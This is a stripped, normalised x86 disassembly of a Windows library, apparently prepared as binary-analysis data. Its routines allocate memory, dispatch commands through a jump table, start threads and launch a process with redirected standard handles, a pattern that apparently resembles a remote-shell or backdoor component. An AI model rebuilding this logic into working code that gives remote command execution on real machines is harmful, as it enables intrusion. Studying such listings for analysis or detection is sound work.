dec [ esi + 0x24 ]
mov eax [ edi + 0xc ]
push eax
call sub_10019ce4
add esp 0x4
sub_1000eec0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002cd61
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push 0x28
call sub_1001a818
mov esi eax
xor ebx ebx
add esp 0x4
mov [ ebp - 0x14 ] esi
cmp esi ebx
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp + 0x8 ] ebx
call sub_10019ba5
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x20 ] r--data
call sub_1001a898
int3
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ esi ] eax
lea eax [ esi + 0x8 ]
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ecx
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp + 0x10 ]
mov ecx [ edx ]
mov [ eax ] ecx
lea ecx [ eax + 0x4 ]
add edx 0x4
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] bl
call sub_100076f0
sub_1000ef90
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
cmp [ edi + 0x24 ] ebx
je r-xdata
mov edx [ edi + 0xc ]
mov esi [ VirtualFree@IAT ]
push 0x2000
push ebx
push edx
call esi
mov eax [ edi + 0x8 ]
push 0x2000
push ebx
push eax
call esi
mov ecx [ edi + 0x10 ]
push 0x2000
push ebx
push ecx
call esi
mov edx [ edi + 0x14 ]
push edx
call sub_1001a3eb
mov eax [ edi + 0x18 ]
push eax
call sub_1001a3eb
mov ecx [ edi + 0x1c ]
push ecx
call sub_1001a3eb
add esp 0xc
lea ecx [ edi + 0x20 ]
call sub_1000ed40
mov edx [ edi + 0x20 ]
push edx
call sub_10019ce4
add esp 0x4
lea ecx [ edi + 0x4 ]
pop edi
pop esi
pop ebx
jmp sub_100199ff
lea esp [ esp ]
cmp [ edi + 0x24 ] ebx
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov [ eax ] ecx
mov edx [ esi ]
mov eax [ esi + 0x4 ]
mov [ edx + 0x4 ] eax
cmp [ esi + 0x20 ] 0x10
jb r-xdata
mov eax [ edi + 0x20 ]
mov esi [ eax ]
cmp esi eax
je r-xdata
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] ebx
push esi
mov [ esi + 0xc ] bl
call sub_10019ce4
add esp 0x4
dec [ edi + 0x24 ]
mov ecx [ esi + 0xc ]
push ecx
call sub_10019ce4
add esp 0x4
sub_1000f050
push ebp
mov ebp esp
push 0xffffffff
push sub_1002cdb1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
lea ecx [ ebx + 0x4 ]
mov [ ebp - 0x5c ] ebx
call sub_100199e5
xor edi edi
lea esi [ ebx + 0x20 ]
push 0x28
mov [ ebp - 0x4 ] edi
mov [ esi + 0x4 ] edi
call sub_1001a818
add esp 0x4
cmp eax edi
je r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x60 ] edi
call sub_10019ba5
push r--data
lea edx [ ebp - 0x6c ]
push edx
mov [ ebp - 0x6c ] r--data
call sub_1001a898
int3
mov [ esi ] eax
mov [ eax ] eax
mov eax [ esi ]
mov [ eax + 0x4 ] eax
mov [ ebx + 0x2c ] edi
push 0x18
mov [ ebp - 0x4 ] 0x1
mov [ ebx ] 0x32
call sub_1001a818
add esp 0x4
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax edi
je r-xdata
xor ebx ebx
mov ecx eax
call sub_10012700
mov ebx eax
jmp r-xdata
push r--data
call sub_100190f4
inc ecx
mov [ esi + 0x4 ] ecx
mov [ edi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov edi 0x10
mov [ ecx ] eax
cmp [ ebp - 0x18 ] edi
jb r-xdata
push 0xc
push rw-data
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call sub_10012790
mov [ ebp - 0x58 ] rw-data
mov [ ebp - 0x54 ] rw-data
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10019ce4
add esp 0x4
mov eax [ ebp - 0x50 ]
add [ ebp - 0x54 ] 0x1e
add [ ebp - 0x58 ] 0x4
add eax 0x1e
mov [ ebp - 0x50 ] eax
cmp eax 0x23a
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_10019ce4
add esp 0x4
mov eax [ ebp - 0x54 ]
push 0x1e
push eax
mov ecx ebx
call sub_10012770
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx ebx
call sub_10012d50
mov edx [ ebp - 0x58 ]
push eax
push edx
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_1000eda0
add esp 0xc
mov ecx [ esi ]
mov edi [ ecx ]
mov ecx [ edi + 0x4 ]
push eax
push ecx
push edi
mov ecx esi
mov [ ebp - 0x4 ] 0x4
call sub_1000eec0
mov ecx [ esi + 0x4 ]
mov edx 0x7fffffe
sub edx ecx
cmp edx 0x1
jb r-xdata
test ebx ebx
je r-xdata
mov esi [ ebp - 0x5c ]
movzx edx [ esi ]
mov edi [ VirtualAlloc@IAT ]
push 0x4
push 0x3000
add edx 0x14
push edx
push 0x0
call edi
mov [ esi + 0x10 ] eax
test eax eax
je r-xdata
mov ecx ebx
call sub_10012740
push ebx
call sub_10019ce4
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
push 0x4
push 0x3000
push 0x104
push 0x0
call edi
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
push 0x4
push 0x3000
push 0x118
push 0x0
call edi
mov [ esi + 0xc ] eax
test eax eax
je r-xdata
mov eax [ rw-data ]
push 0x1
push eax
call sub_1001a8ef
push 0x1
push 0x104
mov [ esi + 0x14 ] eax
call sub_1001a8ef
push 0x1
push 0x104
mov [ esi + 0x18 ] eax
call sub_1001a8ef
add esp 0x18
mov [ esi + 0x1c ] eax
sub_1000f2a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002cdf8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov ecx [ ebp + 0x8 ]
movzx eax [ ecx ]
xor edx edx
xor edi edi
test ax ax
je r-xdata
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax ecx
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
lea esi [ eax + 0x2 ]
mov edi edi
lea esp [ esp ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x2c ]
call sub_100034e0
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
mov ecx edx
cmp eax 0x8
jae r-xdata
movzx eax ax
ror edi 0xd
inc edx
add edi eax
movzx eax [ ecx + edx * 2 ]
test ax ax
jne r-xdata
mov esi [ ebp - 0x1c ]
cmp eax 0x8
lea ecx [ ecx + esi * 2 ]
mov eax edx
jae r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x70 ]
push edx
push ecx
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
call sub_1000e110
mov [ ebp - 0x4 ] 0x1
test edi edi
jne r-xdata
lea eax [ ebp - 0x2c ]
lea ecx [ ebx + 0x4 ]
mov [ ebp - 0x6c ] ecx
call sub_10019a16
mov eax [ ebx + 0x20 ]
mov ecx [ eax ]
mov [ ebx + 0x2c ] ecx
cmp ecx eax
je r-xdata
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x70 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_1000ed00
add esp 0xc
mov ecx [ ebx + 0x20 ]
mov edi [ ecx ]
push eax
mov eax [ edi + 0x4 ]
push eax
push edi
lea ecx [ ebx + 0x20 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000eec0
mov ecx [ ebx + 0x24 ]
mov edx 0x7fffffe
sub edx ecx
cmp edx 0x1
jae r-xdata
lea ebx [ ebx ]
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_10019ce4
add esp 0x4
inc ecx
mov [ ebx + 0x24 ] ecx
mov [ edi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov esi 0x10
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x50 ] esi
jb r-xdata
push r--data
call sub_100190f4
mov ecx [ ebp - 0x6c ]
call sub_10019a1f
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
mov eax [ edx ]
mov [ ebx + 0x2c ] eax
mov eax [ ebx + 0x20 ]
cmp [ ebx + 0x2c ] eax
jne r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0x6c ]
call sub_10019a1f
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10019ce4
add esp 0x4
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10019ce4
add esp 0x4
mov edx [ ebx + 0x2c ]
cmp [ edx + 0x8 ] edi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10019ce4
add esp 0x4
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
xor al al
jmp r-xdata
mov al 0x1
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
sub_1000f4c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002ce20
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
call sub_100105a0
push 0x0
call sub_1001ad90
sub_1000f550
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx ecx
mov ecx [ ebx + 0x8 ]
mov eax 0xfffffff
push edi
mov edi [ ebp + 0x8 ]
sub eax ecx
cmp eax edi
jae r-xdata
mov eax ecx
shr eax 0x1
cmp eax 0x8
jae r-xdata
push r--data
call sub_100190f4
cmp edi eax
jae r-xdata
mov eax 0x8
push esi
mov esi [ ebx + 0xc ]
shr esi 0x2
lea eax [ ecx + edi ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov edx 0xfffffff
sub edx eax
cmp ecx edx
ja r-xdata
mov ecx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
add eax eax
add eax eax
add esi esi
add esi esi
lea edx [ esi + ecx ]
sub eax edx
add eax ecx
mov ecx [ ebp - 0x4 ]
sar eax 0x2
add eax eax
add eax eax
push eax
push edx
lea edx [ esi + ecx ]
push edx
mov [ ebp - 0xc ] eax
call sub_1001a060
add eax [ ebp - 0xc ]
mov ecx [ ebx + 0x4 ]
add esp 0xc
cmp [ ebp - 0x8 ] edi
ja r-xdata
cmp eax 0x3fffffff
ja r-xdata
mov [ ebp + 0x8 ] eax
mov edi eax
lea edx [ edi * 4 ]
sar edx 0x2
add edx edx
add edx edx
push edx
push ecx
push eax
call sub_1001a060
mov eax [ ebx + 0x4 ]
lea ecx [ eax + edi * 4 ]
sub esi ecx
add esi eax
mov eax [ ebp - 0x4 ]
sar esi 0x2
add esi esi
add esi esi
push esi
push ecx
push eax
call sub_1001a060
add esp 0x18
lea edx [ esi + eax ]
test edi edi
je r-xdata
sar esi 0x2
mov edx esi
add edx edx
add edx edx
push edx
push ecx
push eax
mov esi edi
mov [ ebp - 0xc ] edx
call sub_1001a060
mov edx eax
add edx [ ebp - 0xc ]
add esp 0xc
sub esi [ ebp - 0x8 ]
je r-xdata
lea edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x18 ]
mov [ ebp + 0x8 ] 0x0
call sub_10019ba5
push r--data
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x18 ] r--data
call sub_1001a898
int3
add eax eax
add eax eax
push eax
call sub_1001a818
add esp 0x4
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
pop esi
test eax eax
je r-xdata
mov ecx edi
mov edi edx
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov ecx esi
xor eax eax
mov edi edx
[ edi ]
mov edi [ ebp + 0x8 ]
add [ ebx + 0x8 ] edi
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0x4 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_10019ce4
add esp 0x4
mov edi [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
[ edi ]
mov edi [ ebp + 0x8 ]
sub_1000f6e0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
add ecx eax
push edi
test cl 0x3
jne r-xdata
mov ebx [ esi + 0xc ]
add ebx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov edi ebx
shr edi 0x2
cmp eax edi
ja r-xdata
add eax 0x4
shr eax 0x2
cmp [ esi + 0x8 ] eax
ja r-xdata
mov edx [ esi + 0x4 ]
cmp [ edx + edi * 4 ] 0x0
jne r-xdata
sub edi eax
push 0x1
mov ecx esi
call sub_1000f550
mov ecx [ esi + 0x4 ]
mov edx [ ecx + edi * 4 ]
and ebx 0x3
lea ebx [ edx + ebx * 4 ]
test ebx ebx
je r-xdata
push 0x10
call sub_1001a818
add esp 0x4
test eax eax
je r-xdata
inc [ esi + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ebx ] ecx
lea edx [ ebp - 0x4 ]
push edx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10019ba5
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_1001a898
int3
mov ecx [ esi + 0x4 ]
mov [ ecx + edi * 4 ] eax
sub_1000f7b0
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp [ ecx + 0x40 ] eax
je r-xdata
mov esp ebp
pop ebp
retn
push esi
lea esi [ ecx + 0x30 ]
lea eax [ ebp - 0xc ]
push eax
mov ecx esi
call sub_100018f0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov eax [ eax + ecx * 4 ]
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov eax ecx
push edi
mov edi [ edx + 0x8 ]
shr eax 0x2
and ecx 0x3
cmp edi eax
ja r-xdata
pop edi
pop esi
mov edi [ esi + 0x8 ]
inc [ esi + 0xc ]
add edi edi
add edi edi
cmp edi [ esi + 0xc ]
ja r-xdata
dec ecx
mov [ esi + 0x10 ] ecx
jne r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0xc ] 0x0
sub_1000f830
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp [ ecx + 0x20 ] eax
je r-xdata
mov esp ebp
pop ebp
retn
push esi
lea esi [ ecx + 0x10 ]
lea eax [ ebp - 0xc ]
push eax
mov ecx esi
call sub_100018f0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
mov eax [ eax + ecx * 4 ]
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov eax ecx
push edi
mov edi [ edx + 0x8 ]
shr eax 0x2
and ecx 0x3
cmp edi eax
ja r-xdata
pop edi
pop esi
mov edi [ esi + 0x8 ]
inc [ esi + 0xc ]
add edi edi
add edi edi
cmp edi [ esi + 0xc ]
ja r-xdata
dec ecx
mov [ esi + 0x10 ] ecx
jne r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0xc ] 0x0
sub_1000f8b0
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
test esi esi
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
push ebx
push edi
mov edi [ esi + 0x10 ]
push 0x1
push edi
call sub_1001a8ef
add esp 0x8
cmp [ esi + 0x14 ] 0x10
mov ebx eax
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
pop edi
pop ebx
jb r-xdata
push 0x10
call sub_1001a818
add esp 0x4
test eax eax
je r-xdata
push edi
push eax
push ebx
call sub_10019cf0
add esp 0xc
test ebx ebx
je r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push esi
mov [ esi ] 0x0
call sub_10019ce4
add esp 0x4
mov ecx [ esi ]
push ecx
call sub_10019ce4
add esp 0x4
xor eax eax
mov cx [ rw-data ]
mov dl [ rw-data ]
mov [ eax + 0x4 ] cx
mov [ eax + 0x6 ] 0x64
mov [ eax + 0x7 ] dl
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] edi
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
add ecx 0x28
call sub_1000f6e0
sub_1000f970
push ebp
mov ebp esp
push 0xffffffff
push sub_1002ce61
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x18 ] edi
push 0x2
mov [ edi ] r--data
call sub_1001a818
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
xor ecx ecx
mov [ eax ] cx
jmp r-xdata
lea edx [ ebp - 0x14 ]
push edx
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x14 ] ebx
call sub_10019ba5
push r--data
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x30 ] r--data
call sub_1001a898
int3
mov [ esi ] eax
xor edx edx
mov [ eax + 0x4 ] edx
xor ecx ecx
mov [ eax ] ecx
mov edx [ esi ]
mov [ edx ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
lea esi [ edi + 0x30 ]
push 0x8
mov [ ebp - 0x4 ] ebx
mov [ esi ] ebx
call sub_1001a818
add esp 0x4
cmp eax ebx
je r-xdata
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] r--data
mov [ edi ] r--data
mov [ edi + 0x8 ] r--data
lea esi [ edi + 0x18 ]
push 0x8
mov [ esi ] ebx
call sub_1001a818
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x10 ] ebx
call sub_10019ba5
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
mov [ ebp - 0x24 ] r--data
call sub_1001a898
mov [ esi ] eax
xor ecx ecx
mov [ eax ] ecx
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ esi ]
mov [ eax ] esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov ecx [ edi + 0x4 ]
mov dx [ rw-data ]
mov [ edi + 0x10 ] ebx
push 0x44
mov [ ebp - 0x4 ] 0x1
mov [ ecx ] dx
call sub_1001a818
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
xor eax eax
mov ecx eax
call sub_100101e0
jmp r-xdata
lea ecx [ edi + 0x8 ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x1
mov [ edi + 0x14 ] eax
call sub_1000fe50
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000fae0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002cef6
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp ecx ebx
jne r-xdata
movzx eax [ ecx + 0x6 ]
add eax 0xffffff9b
cmp eax 0x3
ja r-xdata
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
jmp [ eax * 4 + jump_table_1000fe40 ]
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
cmp [ edi + 0x10 ] ebx
jne r-xdata
cmp [ edi + 0x10 ] ebx
je r-xdata
cmp [ edi + 0x10 ] ebx
je r-xdata
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x8
cmp eax ebx
je r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ edi + 0x14 ]
push ebx
push ebx
push eax
push sub_1000f4c0
push ebx
push ebx
call [ CreateThread@IAT ]
push 0x18
mov [ edi + 0x10 ] eax
call sub_1001a818
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x4
cmp eax ebx
je r-xdata
mov esi [ ecx + 0xc ]
push 0x1c
call sub_1001a818
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x7
cmp eax ebx
je r-xdata
xor esi esi
mov ecx eax
call sub_10012700
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
xor esi esi
mov ecx eax
call sub_10012700
mov esi eax
jmp r-xdata
xor esi esi
mov ecx eax
call sub_10012700
mov esi eax
jmp r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
push esi
push ecx
mov ecx eax
call sub_1000b4e0
jmp r-xdata
push 0x19
push rw-data
call sub_10012770
push 0x1c
call sub_1001a818
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0xa
push 0x18
push rw-data
call sub_10012770
push 0x1c
call sub_1001a818
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x9
jmp r-xdata
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] bl
call sub_10012790
mov ecx esi
cmp [ edi + 0x10 ] ebx
jne r-xdata
xor eax eax
push eax
mov ecx esi
call sub_10012d50
jmp r-xdata
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] bl
call sub_10012790
push 0xd
push rw-data
mov ecx esi
call sub_10012770
push 0x1c
call sub_1001a818
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
xor eax eax
push eax
mov ecx esi
call sub_10012d50
jmp r-xdata
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] bl
call sub_10012790
push 0x7
push rw-data
mov ecx esi
call sub_10012770
push 0x1c
call sub_1001a818
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x5
cmp eax ebx
je r-xdata
push 0xa
push 0x1
mov ecx eax
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] eax
call sub_1000aaa0
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ edi + 0x18 ]
call sub_1000f6e0
jmp r-xdata
xor eax eax
push eax
mov ecx esi
call sub_10012d50
jmp r-xdata
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ edi + 0x18 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] eax
call sub_1000f6e0
push 0x15
push rw-data
mov ecx esi
call sub_10012770
push 0x1c
call sub_1001a818
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
xor eax eax
push eax
mov ecx esi
call sub_10012d50
jmp r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
lea ecx [ edi + 0x18 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] eax
call sub_1000f6e0
push 0x14
push rw-data
mov ecx esi
call sub_10012770
push 0x1c
call sub_1001a818
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x6
cmp eax ebx
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov edx [ edi + 0x8 ]
lea ecx [ edi + 0x8 ]
push eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x4 ] bl
call eax
cmp esi ebx
je r-xdata
mov edx [ edi + 0x8 ]
lea ecx [ edi + 0x8 ]
push eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x4 ] bl
call eax
mov [ edi + 0x10 ] ebx
jmp r-xdata
sub_1000fe60
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push edi
push 0x44
xor esi esi
lea eax [ ebp - 0x60 ]
push esi
push eax
mov edi ecx
call sub_1001a9b0
mov ebx [ ebp + 0xc ]
add esp 0xc
xor eax eax
push esi
xor ecx ecx
push 0x1
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
push 0x2
lea ecx [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x60 ] 0x44
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x48 ] esi
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x34 ] 0x101
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] ebx
call [ GetCurrentProcess@IAT ]
push eax
push ebx
call [ GetCurrentProcess@IAT ]
push eax
call [ DuplicateHandle@IAT ]
cmp [ edi + 0x14 ] 0x8
jb r-xdata
lea edx [ ebp - 0x1c ]
push edx
lea eax [ ebp - 0x60 ]
push eax
push esi
push esi
push esi
push 0x1
push esi
push esi
push esi
push edi
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
